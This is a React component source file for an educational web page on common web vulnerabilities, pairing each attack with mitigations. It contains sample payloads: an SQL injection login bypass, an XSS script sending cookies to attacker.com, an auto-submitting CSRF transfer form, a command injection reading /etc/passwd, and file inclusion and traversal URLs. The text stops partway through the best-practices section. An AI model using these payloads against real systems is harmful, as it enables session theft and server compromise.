import { motion } from 'framer-motion';
import { ShieldAlert, Terminal, AlertTriangle, Code, ShieldCheck } from 'lucide-react';
import { slideUp, staggerContainer, staggerItem } from '@utils/animations';
import SEO from '@components/atoms/SEO/SEO';

const WebSecurityVulnerabilities = () => {
    return (
        <>
            <SEO
                title="Web Security Vulnerabilities | Neverland Studio"
                description="Understanding Common Web Attacks in Modern Applications. A comprehensive guide to SQLi, XSS, CSRF, and more."
            />

            <div className="pt-32 pb-24 relative overflow-hidden bg-[#0A0F18] min-h-screen font-sans">
                {/* Background Effects */}
                <div className="absolute inset-0 pointer-events-none z-0">
                    <div className="absolute top-[10%] right-[10%] w-[500px] h-[500px] rounded-full bg-red-500/5 blur-[120px]" />
                    <div className="absolute bottom-[20%] left-[5%] w-[600px] h-[600px] rounded-full bg-blue-500/5 blur-[150px]" />
                    <div className="absolute top-[40%] left-[40%] w-[400px] h-[400px] rounded-full bg-emerald-500/5 blur-[100px]" />
                    <div className="glossary-dot-grid opacity-20 absolute inset-0 mix-blend-overlay" />
                </div>

                <div className="container-custom relative z-10 mx-auto px-4 lg:px-8 max-w-5xl">

                    {/* Header Section */}
                    <motion.div
                        className="text-center mb-20"
                        variants={slideUp}
                        initial="hidden"
                        animate="visible"
                    >
                        <div className="inline-flex items-center gap-2 px-4 py-2 rounded-sm border border-red-500/30 bg-red-500/10 mb-8 backdrop-blur-sm shadow-[0_0_15px_rgba(239,68,68,0.15)]">
                            <ShieldAlert className="w-5 h-5 text-red-500" />
                            <span className="text-xs font-mono font-bold text-red-400 tracking-widest uppercase">Cyber Security Education</span>
                        </div>

                        <h1 className="text-4xl md:text-5xl lg:text-6xl font-black mb-6 tracking-tight uppercase leading-tight font-mono">
                            <span className="text-white drop-shadow-[0_2px_10px_rgba(255,255,255,0.2)]">Web Security </span>
                            <span className="text-red-500 drop-shadow-[0_2px_15px_rgba(239,68,68,0.4)]">Vulnerabilities</span>
                        </h1>

                        <p className="text-lg md:text-xl text-gray-400 max-w-3xl mx-auto leading-relaxed border-l-2 border-red-500/50 pl-6 text-left italic">
                            "Understanding Common Web Attacks in Modern Applications."
                        </p>
                    </motion.div>

                    {/* Content Container */}
                    <motion.div
                        className="space-y-24"
                        variants={staggerContainer}
                        initial="hidden"
                        whileInView="visible"
                        viewport={{ once: true, margin: "-100px" }}
                    >

                        {/* 1. Introduction */}
                        <motion.section variants={staggerItem} className="scroll-mt-24">
                            <div className="flex items-center gap-4 mb-8 border-b border-white/10 pb-4">
                                <span className="text-4xl font-black text-red-500/30 font-mono select-none">01</span>
                                <h2 className="text-3xl font-bold text-white font-mono uppercase tracking-wide">Introduction</h2>
                            </div>
                            
                            <div className="prose prose-invert prose-red max-w-none">
                                <p className="text-gray-300 leading-relaxed md:text-lg mb-6">
                                    <strong>Web Security Vulnerabilities</strong> refer to system flaws, misconfigurations, or software bugs that allow malicious actors to compromise the security, integrity, and availability of web applications. In the modern web ecosystem, applications handle sensitive user data, financial transactions, and critical infrastructure, making them prime targets for cyberattacks.
                                </p>
                                <div className="grid md:grid-cols-2 gap-6 mt-8">
                                    <div className="bg-[#0f172a] border border-white/5 p-6 rounded-sm shadow-xl">
                                        <h3 className="flex items-center gap-2 text-white font-mono text-lg font-bold mb-3"><Terminal className="w-5 h-5 text-blue-400" /> Why It Matters for Developers</h3>
                                        <p className="text-gray-400 text-sm leading-relaxed">Developers are the first line of defense. Understanding how attacks are constructed helps engineers write secure code by default, rather than bolting security on as an afterthought. Secure coding practices directly mitigate the risk of data breaches and maintain user trust.</p>
                                    </div>
                                    <div className="bg-[#0f172a] border border-white/5 p-6 rounded-sm shadow-xl">
                                        <h3 className="flex items-center gap-2 text-white font-mono text-lg font-bold mb-3"><AlertTriangle className="w-5 h-5 text-yellow-400" /> How Attackers Exploit Flaws</h3>
                                        <p className="text-gray-400 text-sm leading-relaxed">Attackers continuously scan and probe applications looking for weaknesses such as improperly validated inputs, outdated dependencies, or logical business flaws. Once identified, they craft specific payloads to execute unauthorized actions or extract data.</p>
                                    </div>
                                </div>
                            </div>
                        </motion.section>

                        {/* 2. SQL Injection (SQLi) */}
                        <motion.section variants={staggerItem} className="scroll-mt-24">
                            <div className="flex items-center gap-4 mb-8 border-b border-white/10 pb-4">
                                <span className="text-4xl font-black text-red-500/30 font-mono select-none">02</span>
                                <h2 className="text-3xl font-bold text-white font-mono uppercase tracking-wide">SQL Injection (SQLi)</h2>
                            </div>
                            
                            <div className="space-y-8">
                                <div>
                                    <h3 className="text-xl font-bold text-red-400 mb-3 font-mono">What is SQL Injection?</h3>
                                    <p className="text-gray-300 leading-relaxed">
                                        SQL Injection (SQLi) is a critical vulnerability that occurs when an application improperly neutralizes user-supplied data before inserting it into a backend database query. This allows an attacker to interfere with the queries that the application makes to its database, potentially viewing, modifying, or deleting data they are not normally able to access.
                                    </p>
                                </div>

                                <div className="bg-[#0f172a] border border-white/5 rounded-sm overflow-hidden shadow-2xl">
                                    <div className="bg-[#1e293b] px-4 py-2 border-b border-white/10 flex items-center justify-between">
                                        <span className="text-xs font-mono font-bold text-gray-400 uppercase tracking-widest"><Code className="w-4 h-4 inline mr-2 text-blue-400" />Vulnerable Query</span>
                                        <span className="text-xs text-red-400 font-mono">Insecure</span>
                                    </div>
                                    <div className="p-4 overflow-x-auto">
                                        <pre className="text-sm font-mono text-gray-300">
                                            <code>
<span className="text-purple-400">SELECT</span> * <span className="text-purple-400">FROM</span> users <span className="text-purple-400">WHERE</span> username = <span className="text-green-400">'$username'</span> <span className="text-purple-400">AND</span> password = <span className="text-green-400">'$password'</span>;
                                            </code>
                                        </pre>
                                    </div>
                                </div>

                                <div>
                                    <h3 className="text-xl font-bold text-red-400 mb-3 font-mono">The Attack Payload</h3>
                                    <p className="text-gray-300 leading-relaxed mb-4">
                                        If an attacker inputs <code>admin' -- </code> as the username, the resulting query fundamentally changes its logic:
                                    </p>
                                    <div className="bg-red-500/5 border border-red-500/20 p-4 rounded-sm">
                                        <code className="text-red-400 font-mono text-sm break-all">SELECT * FROM users WHERE username = 'admin' -- ' AND password = ''</code>
                                        <p className="text-sm text-gray-400 mt-2 italic">The `--` comments out the rest of the query, bypassing the password check entirely.</p>
                                    </div>
                                </div>

                                <div>
                                    <h3 className="text-xl font-bold text-red-400 mb-3 font-mono">Impact & Mitigation</h3>
                                    <ul className="list-disc list-inside text-gray-300 space-y-2 mb-6 marker:text-red-500">
                                        <li><strong>Impact:</strong> Complete database takeover, data exfiltration, authentication bypass, data loss.</li>
                                    </ul>
                                    
                                    <div className="bg-[#0f172a] border border-emerald-500/20 rounded-sm overflow-hidden shadow-2xl relative">
                                        <div className="absolute top-0 left-0 w-1 h-full bg-emerald-500"></div>
                                        <div className="bg-[#1e293b] px-4 py-2 border-b border-white/10 flex items-center justify-between ml-1">
                                            <span className="text-xs font-mono font-bold text-gray-400 uppercase tracking-widest"><ShieldCheck className="w-4 h-4 inline mr-2 text-emerald-400" />Secure Mitigation (Prepared Statements)</span>
                                            <span className="text-xs text-emerald-400 font-mono">Secure</span>
                                        </div>
                                        <div className="p-4 overflow-x-auto ml-1">
                                            <pre className="text-sm font-mono text-gray-300">
                                                <code>
<span className="text-gray-500">// PHP PDO Example</span><br/>
$stmt = $pdo-&gt;<span className="text-blue-400">prepare</span>(<span className="text-green-400">'SELECT * FROM users WHERE username = :username AND password = :password'</span>);<br/>
$stmt-&gt;<span className="text-blue-400">execute</span>(['<span className="text-green-400">username</span>' =&gt; $username, '<span className="text-green-400">password</span>' =&gt; $password]);
                                                </code>
                                            </pre>
                                        </div>
                                    </div>
                                    <p className="text-sm text-gray-400 mt-3 ml-2 italic">Parameterized queries ensure that the database treats the user input strictly as data, not as executable SQL commands.</p>
                                </div>
                            </div>
                        </motion.section>

                        {/* 3. Cross Site Scripting (XSS) */}
                        <motion.section variants={staggerItem} className="scroll-mt-24">
                            <div className="flex items-center gap-4 mb-8 border-b border-white/10 pb-4">
                                <span className="text-4xl font-black text-blue-500/30 font-mono select-none">03</span>
                                <h2 className="text-3xl font-bold text-white font-mono uppercase tracking-wide">Cross-Site Scripting (XSS)</h2>
                            </div>
                            
                            <div className="space-y-8">
                                <div>
                                    <h3 className="text-xl font-bold text-blue-400 mb-3 font-mono">What is XSS?</h3>
                                    <p className="text-gray-300 leading-relaxed">
                                        Cross-Site Scripting (XSS) attacks are a type of injection where malicious scripts are injected into otherwise benign and trusted websites. XSS attacks occur when an application includes untrusted data in a web page without proper validation or escaping.
                                    </p>
                                </div>
                                
                                <div>
                                    <h3 className="text-xl font-bold text-blue-400 mb-3 font-mono">Types of XSS</h3>
                                    <div className="grid md:grid-cols-3 gap-6">
                                        <div className="bg-[#0f172a] border border-white/5 p-5 rounded-sm shadow-lg">
                                            <h4 className="text-white font-bold mb-2">Stored XSS</h4>
                                            <p className="text-sm text-gray-400">The malicious script is permanently stored on the target servers, such as in a database, in a message forum, visitor log, or comment field.</p>
                                        </div>
                                        <div className="bg-[#0f172a] border border-white/5 p-5 rounded-sm shadow-lg">
                                            <h4 className="text-white font-bold mb-2">Reflected XSS</h4>
                                            <p className="text-sm text-gray-400">The injected script is reflected off the web server, such as in an error message, search result, or any response that includes some or all of the input sent to the server.</p>
                                        </div>
                                        <div className="bg-[#0f172a] border border-white/5 p-5 rounded-sm shadow-lg">
                                            <h4 className="text-white font-bold mb-2">DOM-Based XSS</h4>
                                            <p className="text-sm text-gray-400">The vulnerability exists in client-side code rather than server-side code. The maliciously crafted payload modifies the DOM environment in the victim's browser.</p>
                                        </div>
                                    </div>
                                </div>

                                <div className="bg-[#0f172a] border border-white/5 rounded-sm overflow-hidden shadow-2xl">
                                    <div className="bg-[#1e293b] px-4 py-2 border-b border-white/10 flex items-center justify-between">
                                        <span className="text-xs font-mono font-bold text-gray-400 uppercase tracking-widest"><Code className="w-4 h-4 inline mr-2 text-pink-400" />XSS Payload Example</span>
                                        <span className="text-xs text-red-400 font-mono">Attack Vector</span>
                                    </div>
                                    <div className="p-4 overflow-x-auto">
                                        <pre className="text-sm font-mono text-gray-300">
                                            <code>
&lt;<span className="text-pink-400">script</span>&gt;<br/>
&nbsp;&nbsp;&nbsp;&nbsp;<span className="text-blue-400">fetch</span>(<span className="text-green-400">'https://attacker.com/steal?cookie='</span> + <span className="text-purple-400">document.cookie</span>);<br/>
&lt;/<span className="text-pink-400">script</span>&gt;
                                            </code>
                                        </pre>
                                    </div>
                                </div>

                                <div>
                                    <h3 className="text-xl font-bold text-blue-400 mb-3 font-mono">Impact & Mitigation</h3>
                                    <ul className="list-disc list-inside text-gray-300 space-y-2 mb-6 marker:text-blue-500">
                                        <li><strong>Impact:</strong> Session hijacking, stealing sensitive data (cookies, tokens), defacing websites, redirecting users to malicious domains.</li>
                                    </ul>
                                    <div className="bg-[#0f172a] border border-emerald-500/20 rounded-sm p-5 shadow-2xl relative">
                                        <div className="absolute top-0 left-0 w-1 h-full bg-emerald-500"></div>
                                        <h4 className="text-emerald-400 font-bold mb-2 flex items-center gap-2"><ShieldCheck className="w-4 h-4" /> Defense Mechanisms</h4>
                                        <ul className="list-decimal list-inside text-sm font-mono text-gray-300 space-y-2">
                                            <li><strong className="text-white font-sans">Context-Aware Data Encdoing:</strong> Encode output data based on where it is placed (HTML body, attributes, JavaScript, CSS).</li>
                                            <li><strong className="text-white font-sans">Input Validation:</strong> Strictly validate incoming data against expected formats (allow-listing).</li>
                                            <li><strong className="text-white font-sans">Content Security Policy (CSP):</strong> Implement headers like <code>Content-Security-Policy: default-src 'self'</code> to restrict where scripts can be loaded from.</li>
                                        </ul>
                                    </div>
                                </div>
                            </div>
                        </motion.section>

                        {/* 4. Cross-Site Request Forgery (CSRF) */}
                        <motion.section variants={staggerItem} className="scroll-mt-24">
                            <div className="flex items-center gap-4 mb-8 border-b border-white/10 pb-4">
                                <span className="text-4xl font-black text-purple-500/30 font-mono select-none">04</span>
                                <h2 className="text-3xl font-bold text-white font-mono uppercase tracking-wide">Cross-Site Request Forgery (CSRF)</h2>
                            </div>
                            
                            <div className="space-y-8">
                                <div className="grid md:grid-cols-5 gap-6">
                                    <div className="md:col-span-3">
                                        <h3 className="text-xl font-bold text-purple-400 mb-3 font-mono">What is CSRF?</h3>
                                        <p className="text-gray-300 leading-relaxed mb-4">
                                            CSRF is an attack that forces an authenticated user to execute unwanted actions on a web application in which they are currently authenticated. With a little help of social engineering (such as sending a link via email or chat), an attacker may trick the users of a web application into executing actions of the attacker's choosing.
                                        </p>
                                        <p className="text-gray-300 leading-relaxed">
                                            If the victim is a normal user, a successful CSRF attack can force the user to perform state changing requests like transferring funds, changing their email address, and so forth.
                                        </p>
                                    </div>
                                    <div className="md:col-span-2 bg-[#0f172a] border border-purple-500/20 p-5 rounded-sm flex items-center justify-center shadow-lg">
                                       <div className="text-center">
                                            <AlertTriangle className="w-10 h-10 text-purple-400 mx-auto mb-3" />
                                            <p className="text-sm text-gray-400 italic">"The browser automatically sends session cookies with cross-origin requests, which attackers exploit for CSRF attacks."</p>
                                       </div>
                                    </div>
                                </div>

                                <div className="bg-[#0f172a] border border-white/5 rounded-sm overflow-hidden shadow-2xl">
                                    <div className="bg-[#1e293b] px-4 py-2 border-b border-white/10 flex items-center justify-between">
                                        <span className="text-xs font-mono font-bold text-gray-400 uppercase tracking-widest"><Code className="w-4 h-4 inline mr-2 text-purple-400" />CSRF Attack Scenario</span>
                                        <span className="text-xs text-red-400 font-mono">Hidden Form</span>
                                    </div>
                                    <div className="p-4 overflow-x-auto">
                                        <pre className="text-sm font-mono text-gray-300">
                                            <code>
<span className="text-gray-500">&lt;!-- Hosted on attacker.com --&gt;</span><br/>
&lt;<span className="text-pink-400">form</span> <span className="text-green-400">action</span>=<span className="text-yellow-400">"https://bank.example.com/transfer"</span> <span className="text-green-400">method</span>=<span className="text-yellow-400">"POST"</span>&gt;<br/>
&nbsp;&nbsp;&nbsp;&nbsp;&lt;<span className="text-pink-400">input</span> <span className="text-green-400">type</span>=<span className="text-yellow-400">"hidden"</span> <span className="text-green-400">name</span>=<span className="text-yellow-400">"acct"</span> <span className="text-green-400">value</span>=<span className="text-yellow-400">"ATTACKER_ACCOUNT"</span> /&gt;<br/>
&nbsp;&nbsp;&nbsp;&nbsp;&lt;<span className="text-pink-400">input</span> <span className="text-green-400">type</span>=<span className="text-yellow-400">"hidden"</span> <span className="text-green-400">name</span>=<span className="text-yellow-400">"amount"</span> <span className="text-green-400">value</span>=<span className="text-yellow-400">"100000"</span> /&gt;<br/>
&lt;/<span className="text-pink-400">form</span>&gt;<br/>
&lt;<span className="text-pink-400">script</span>&gt;<span className="text-purple-400">document.forms</span>[0].<span className="text-blue-400">submit</span>();&lt;/<span className="text-pink-400">script</span>&gt;
                                            </code>
                                        </pre>
                                    </div>
                                </div>

                                <div className="bg-[#0f172a] border border-emerald-500/20 rounded-sm p-5 shadow-2xl relative">
                                    <div className="absolute top-0 left-0 w-1 h-full bg-emerald-500"></div>
                                    <h4 className="text-emerald-400 font-bold mb-2 flex items-center gap-2"><ShieldCheck className="w-4 h-4" /> Defense Mechanisms</h4>
                                    <ul className="list-decimal list-inside text-sm font-mono text-gray-300 space-y-2">
                                        <li><strong className="text-white font-sans">Anti-CSRF Tokens:</strong> Require an unpredictable, user-specific token in state-changing requests.</li>
                                        <li><strong className="text-white font-sans">SameSite Cookies:</strong> Use the <code>SameSite</code> attribute (Lax or Strict) on session cookies to prevent the browser from sending them with cross-site requests.</li>
                                    </ul>
                                </div>
                            </div>
                        </motion.section>

                        {/* 5. Command Injection */}
                        <motion.section variants={staggerItem} className="scroll-mt-24">
                            <div className="flex items-center gap-4 mb-8 border-b border-white/10 pb-4">
                                <span className="text-4xl font-black text-orange-500/30 font-mono select-none">05</span>
                                <h2 className="text-3xl font-bold text-white font-mono uppercase tracking-wide">Command Injection</h2>
                            </div>
                            
                            <div className="space-y-8">
                                <div>
                                    <h3 className="text-xl font-bold text-orange-400 mb-3 font-mono">What is Command Injection?</h3>
                                    <p className="text-gray-300 leading-relaxed">
                                        OS Command Injection is a vulnerability that allows an attacker to execute arbitrary operating system (OS) commands on the server that is running an application, typically fully compromising the application and all its data.
                                    </p>
                                </div>

                                <div className="bg-[#0f172a] border border-white/5 rounded-sm overflow-hidden shadow-2xl">
                                    <div className="bg-[#1e293b] px-4 py-2 border-b border-white/10 flex items-center justify-between">
                                        <span className="text-xs font-mono font-bold text-gray-400 uppercase tracking-widest"><Code className="w-4 h-4 inline mr-2 text-orange-400" />Vulnerable Execution (Node.js)</span>
                                        <span className="text-xs text-red-400 font-mono">Insecure</span>
                                    </div>
                                    <div className="p-4 overflow-x-auto">
                                        <pre className="text-sm font-mono text-gray-300">
                                            <code>
<span className="text-purple-400">const</span> &#123; exec &#125; = <span className="text-blue-400">require</span>(<span className="text-green-400">'child_process'</span>);<br/><br/>
<span className="text-gray-500">// Vulnerable: Executing ping with user-supplied IP directly string-concatenated</span><br/>
<span className="text-blue-400">exec</span>(`ping -c 4 <span className="text-orange-400">$&#123;req.body.ipAddress&#125;</span>`, (error, stdout) =&gt; &#123;<br/>
&nbsp;&nbsp;&nbsp;&nbsp;<span className="text-blue-400">console.log</span>(stdout);<br/>
&#125;);
                                            </code>
                                        </pre>
                                    </div>
                                </div>

                                <div>
                                    <h3 className="text-xl font-bold text-orange-400 mb-3 font-mono">The Attack Payload</h3>
                                    <p className="text-gray-300 leading-relaxed mb-4">
                                        If an attacker provides an IP address like this:
                                    </p>
                                    <div className="bg-red-500/5 border border-red-500/20 p-4 rounded-sm flex flex-col gap-2">
                                        <code className="text-red-400 font-mono text-sm break-all">127.0.0.1; cat /etc/passwd</code>
                                        <p className="text-sm text-gray-400 italic">The semicolon terminates the ping command and starts a new command (`cat /etc/passwd`), exposing sensitive server files.</p>
                                    </div>
                                </div>

                                <div className="bg-[#0f172a] border border-emerald-500/20 rounded-sm p-5 shadow-2xl relative">
                                    <div className="absolute top-0 left-0 w-1 h-full bg-emerald-500"></div>
                                    <h4 className="text-emerald-400 font-bold mb-2 flex items-center gap-2"><ShieldCheck className="w-4 h-4" /> Mitigating OS Command Injection</h4>
                                    <ul className="list-decimal list-inside text-sm font-mono text-gray-300 space-y-2">
                                        <li><strong className="text-white font-sans">Avoid OS Execution:</strong> Whenever possible, use built-in language APIs rather than calling out to OS commands.</li>
                                        <li><strong className="text-white font-sans">Use Safe APIs:</strong> If you must execute OS commands, use APIs that pass arguments as an array rather than a single string to a shell (e.g., `execFile` or `spawn` in Node.js instead of `exec`).</li>
                                        <li><strong className="text-white font-sans">Strict Input Validation:</strong> Validate the input against a very strict allow-list (e.g., regex confirming it is strictly an IP address).</li>
                                    </ul>
                                </div>
                            </div>
                        </motion.section>

                        {/* 6. File Inclusion (LFI/RFI) */}
                        <motion.section variants={staggerItem} className="scroll-mt-24">
                            <div className="flex items-center gap-4 mb-8 border-b border-white/10 pb-4">
                                <span className="text-4xl font-black text-rose-500/30 font-mono select-none">06</span>
                                <h2 className="text-3xl font-bold text-white font-mono uppercase tracking-wide">File Inclusion (LFI & RFI)</h2>
                            </div>
                            
                            <div className="space-y-8">
                                <div>
                                    <h3 className="text-xl font-bold text-rose-400 mb-3 font-mono">What is File Inclusion?</h3>
                                    <p className="text-gray-300 leading-relaxed">
                                        File Inclusion vulnerabilities occur when an application build paths to executable code using an attacker-controlled variable in a way that allows the attacker to control which file is executed at runtime.
                                    </p>
                                </div>
                                
                                <div className="grid md:grid-cols-2 gap-6">
                                    <div className="bg-[#0f172a] border border-white/5 p-6 rounded-sm shadow-xl">
                                        <h4 className="flex items-center gap-2 text-white font-mono text-lg font-bold mb-3"><Terminal className="w-5 h-5 text-rose-400" /> Local File Inclusion (LFI)</h4>
                                        <p className="text-gray-400 text-sm leading-relaxed mb-4">Allows an attacker to include files on a server through the web browser. The attacker can only include files that exist locally on the target server.</p>
                                        <div className="bg-rose-500/5 border border-rose-500/20 p-3 rounded-sm">
                                            <code className="text-rose-400 font-mono text-xs break-all">https://example.com/?page=../../../../etc/passwd</code>
                                        </div>
                                    </div>
                                    <div className="bg-[#0f172a] border border-white/5 p-6 rounded-sm shadow-xl">
                                        <h4 className="flex items-center gap-2 text-white font-mono text-lg font-bold mb-3"><AlertTriangle className="w-5 h-5 text-rose-400" /> Remote File Inclusion (RFI)</h4>
                                        <p className="text-gray-400 text-sm leading-relaxed mb-4">Allows an attacker to include remote files (usually from an attacker-controlled server). This almost always leads to full Remote Code Execution (RCE).</p>
                                        <div className="bg-rose-500/5 border border-rose-500/20 p-3 rounded-sm">
                                            <code className="text-rose-400 font-mono text-xs break-all">https://example.com/?page=http://attacker.com/malicious.php</code>
                                        </div>
                                    </div>
                                </div>

                                <div className="bg-[#0f172a] border border-emerald-500/20 rounded-sm p-5 shadow-2xl relative">
                                    <div className="absolute top-0 left-0 w-1 h-full bg-emerald-500"></div>
                                    <h4 className="text-emerald-400 font-bold mb-2 flex items-center gap-2"><ShieldCheck className="w-4 h-4" /> Defense Mechanisms</h4>
                                    <ul className="list-decimal list-inside text-sm font-mono text-gray-300 space-y-2">
                                        <li><strong className="text-white font-sans">Never pass user input directly into file system APIs:</strong> Instead of `include($_GET['page'])`, map string identifiers to static local file paths.</li>
                                        <li><strong className="text-white font-sans">Disable remote file inclusion:</strong> In PHP, ensure `allow_url_include = Off` in `php.ini`.</li>
                                    </ul>
                                </div>
                            </div>
                        </motion.section>

                        {/* 7. Directory Traversal */}
                        <motion.section variants={staggerItem} className="scroll-mt-24">
                            <div className="flex items-center gap-4 mb-8 border-b border-white/10 pb-4">
                                <span className="text-4xl font-black text-amber-500/30 font-mono select-none">07</span>
                                <h2 className="text-3xl font-bold text-white font-mono uppercase tracking-wide">Directory Traversal</h2>
                            </div>
                            
                            <div className="space-y-8">
                                <div>
                                    <h3 className="text-xl font-bold text-amber-400 mb-3 font-mono">What is Directory Traversal?</h3>
                                    <p className="text-gray-300 leading-relaxed">
                                        Also known as Path Traversal, this vulnerability allows an attacker to read arbitrary files on the server that is running an application. This might include application code and data, back-end credentials, or sensitive operating system files.
                                    </p>
                                </div>

                                <div className="bg-[#0f172a] border border-white/5 rounded-sm overflow-hidden shadow-2xl">
                                    <div className="bg-[#1e293b] px-4 py-2 border-b border-white/10 flex items-center justify-between">
                                        <span className="text-xs font-mono font-bold text-gray-400 uppercase tracking-widest"><Code className="w-4 h-4 inline mr-2 text-amber-400" />Path Traversal Attack Example</span>
                                        <span className="text-xs text-red-400 font-mono">Payload</span>
                                    </div>
                                    <div className="p-4 overflow-x-auto">
                                        <div className="mb-4">
                                            <p className="text-gray-400 text-sm font-mono mb-2">Normal Request:</p>
                                            <code className="text-green-400 font-mono text-sm">https://example.com/loadImage?filename=logo.png</code>
                                        </div>
                                        <div>
                                            <p className="text-gray-400 text-sm font-mono mb-2">Malicious Request:</p>
                                            <code className="text-red-400 font-mono text-sm font-bold">https://example.com/loadImage?filename=../../../etc/passwd</code>
                                        </div>
                                    </div>
                                </div>

                                <div className="bg-[#0f172a] border border-emerald-500/20 rounded-sm p-5 shadow-2xl relative">
                                    <div className="absolute top-0 left-0 w-1 h-full bg-emerald-500"></div>
                                    <h4 className="text-emerald-400 font-bold mb-2 flex items-center gap-2"><ShieldCheck className="w-4 h-4" /> Defense Mechanisms</h4>
                                    <ul className="list-decimal list-inside text-sm font-mono text-gray-300 space-y-2">
                                        <li><strong className="text-white font-sans">Validate against an exact list of permitted values:</strong> If expecting a filename, ensure it only contains alphanumeric characters.</li>
                                        <li><strong className="text-white font-sans">Resolve and verify absolute paths:</strong> Use functions like `realpath()` and ensure the resulting path starts with the expected base directory before granting access.</li>
                                    </ul>
                                </div>
                            </div>
                        </motion.section>

                        {/* 8. Broken Authentication */}
                        <motion.section variants={staggerItem} className="scroll-mt-24">
                            <div className="flex items-center gap-4 mb-8 border-b border-white/10 pb-4">
                                <span className="text-4xl font-black text-cyan-500/30 font-mono select-none">08</span>
                                <h2 className="text-3xl font-bold text-white font-mono uppercase tracking-wide">Broken Authentication</h2>
                            </div>
                            
                            <div className="space-y-8">
                                <div>
                                    <h3 className="text-xl font-bold text-cyan-400 mb-3 font-mono">What is Broken Authentication?</h3>
                                    <p className="text-gray-300 leading-relaxed">
                                        Broken Authentication vulnerabilities allow attackers to compromise passwords, keys, or session tokens, resulting in them assuming the identities of legitimate users. This is often the result of poorly implemented identity and access management controls.
                                    </p>
                                </div>
                                
                                <div className="grid md:grid-cols-2 gap-6">
                                    <div className="bg-[#0f172a] border border-white/5 p-6 rounded-sm shadow-xl border-t-2 border-t-cyan-500">
                                        <h4 className="text-white font-bold mb-2">Session Hijacking & Fixation</h4>
                                        <p className="text-sm text-gray-400">Occurs when session IDs are exposed in the URL, not rotated after login, or aren't invalidated upon logout. This allows an attacker to steal and use an active session.</p>
                                    </div>
                                    <div className="bg-[#0f172a] border border-white/5 p-6 rounded-sm shadow-xl border-t-2 border-t-cyan-500">
                                        <h4 className="text-white font-bold mb-2">Credential Stuffing</h4>
                                        <p className="text-sm text-gray-400">Attackers use automated tools to test lists of compromised username/password pairs against your application, hoping users recycle passwords across sites.</p>
                                    </div>
                                </div>

                                <div className="bg-[#0f172a] border border-emerald-500/20 rounded-sm p-5 shadow-2xl relative">
                                    <div className="absolute top-0 left-0 w-1 h-full bg-emerald-500"></div>
                                    <h4 className="text-emerald-400 font-bold mb-2 flex items-center gap-2"><ShieldCheck className="w-4 h-4" /> Defense Mechanisms</h4>
                                    <ul className="list-decimal list-inside text-sm font-mono text-gray-300 space-y-2">
                                        <li><strong className="text-white font-sans">Multi-Factor Authentication (MFA):</strong> Implement MFA to prevent credential stuffing and brute force attacks.</li>
                                        <li><strong className="text-white font-sans">Secure Password Practices:</strong> Do not deploy with default credentials. Enforce strong passwords and use strong hashing algorithms (e.g., Argon2, bcrypt) with salt.</li>
                                        <li><strong className="text-white font-sans">Strict Session Management:</strong> Generate high-entropy session IDs, enforce secure and HTTPOnly flags on cookies, and explicitly destroy sessions on the server upon logout.</li>
                                    </ul>
                                </div>
                            </div>
                        </motion.section>

                        {/* 9. Sensitive Data Exposure */}
                        <motion.section variants={staggerItem} className="scroll-mt-24">
                            <div className="flex items-center gap-4 mb-8 border-b border-white/10 pb-4">
                                <span className="text-4xl font-black text-fuchsia-500/30 font-mono select-none">09</span>
                                <h2 className="text-3xl font-bold text-white font-mono uppercase tracking-wide">Sensitive Data Exposure</h2>
                            </div>
                            
                            <div className="space-y-8">
                                <div>
                                    <h3 className="text-xl font-bold text-fuchsia-400 mb-3 font-mono">What is Sensitive Data Exposure?</h3>
                                    <p className="text-gray-300 leading-relaxed">
                                        Many web applications and APIs do not properly protect sensitive data, such as financial, healthcare, and PII (Personally Identifiable Information). Attackers may steal or modify such weakly protected data to conduct credit card fraud, identity theft, or other crimes.
                                    </p>
                                </div>
                                
                                <div className="grid md:grid-cols-2 gap-6">
                                    <div className="bg-[#0f172a] border border-white/5 p-6 rounded-sm shadow-xl">
                                        <h4 className="flex items-center gap-2 text-white font-mono text-lg font-bold mb-3"><Terminal className="w-5 h-5 text-fuchsia-400" /> Data in Transit</h4>
                                        <p className="text-gray-400 text-sm leading-relaxed mb-4">Occurs when data is transmitted over the network in cleartext (HTTP, FTP) or using weak cryptographic protocols. Attackers can perform Man-in-the-Middle (MitM) attacks to intercept the data.</p>
                                    </div>
                                    <div className="bg-[#0f172a] border border-white/5 p-6 rounded-sm shadow-xl">
                                        <h4 className="flex items-center gap-2 text-white font-mono text-lg font-bold mb-3"><AlertTriangle className="w-5 h-5 text-fuchsia-400" /> Data at Rest</h4>
                                        <p className="text-gray-400 text-sm leading-relaxed mb-4">Occurs when databases or files storing sensitive information are not encrypted, or use weak algorithms (like MD5 or SHA1 for passwords). If an attacker breaches the server, the data is immediately compromised.</p>
                                    </div>
                                </div>

                                <div className="bg-[#0f172a] border border-emerald-500/20 rounded-sm p-5 shadow-2xl relative">
                                    <div className="absolute top-0 left-0 w-1 h-full bg-emerald-500"></div>
                                    <h4 className="text-emerald-400 font-bold mb-2 flex items-center gap-2"><ShieldCheck className="w-4 h-4" /> Defense Mechanisms</h4>
                                    <ul className="list-decimal list-inside text-sm font-mono text-gray-300 space-y-2">
                                        <li><strong className="text-white font-sans">Encrypt Data in Transit:</strong> Always use TLS (Transport Layer Security) for all data exchanges. Enforce HTTP Strict Transport Security (HSTS).</li>
                                        <li><strong className="text-white font-sans">Encrypt Data at Rest:</strong> Encrypt all sensitive data where it is stored. Don't store sensitive data unnecessarily.</li>
                                        <li><strong className="text-white font-sans">Strong Cryptography:</strong> Ensure up-to-date and strong standard algorithms and keys are in place, and proper key management is implemented.</li>
                                    </ul>
                                </div>
                            </div>
                        </motion.section>

                        {/* 10. Security Best Practices Summary */}
                        <motion.section variants={staggerItem} className="scroll-mt-24">
                            <div className="flex items-center gap-4 mb-8 border-b border-white/10 pb-4">
                                <span className="text-4xl font-black text-emerald-500/30 font-mono select-none">10</span>
                                <h2 className="text-3xl font-bold text-white font-mono uppercase tracking-wide">Security Best Practices</h2>
                            </div>
                            
                            <div className="bg-gradient-to-br from-[#0f172a] to-[#1e293b] border border-white/5 p-8 rounded-sm shadow-2xl relative overflow-hidden">
                                <div className="absolute top-[-50px] right-[-50px] w-32 h-32 bg-emerald-500/20 rounded-full blur-3xl"></div>
                                <p className="text-gray-300 leading-relaxed mb-8 relative z-10">
                                    Security is a continuous process, not a destination. Implementing individual fixes for specific vulnerabilities is important, but a holistic approach to application security is essential. Here is a summary of fundamental principles every developer should follow:
                                </p>
                                
                                <div className="grid md:grid-cols-2 gap-x-8 gap-y-6 relative z-10">
                                    <div className="flex gap-3">
                                        <ShieldCheck className="w-6 h-6 text-emerald-400 shrink-0 mt-1" />
                                        <div>
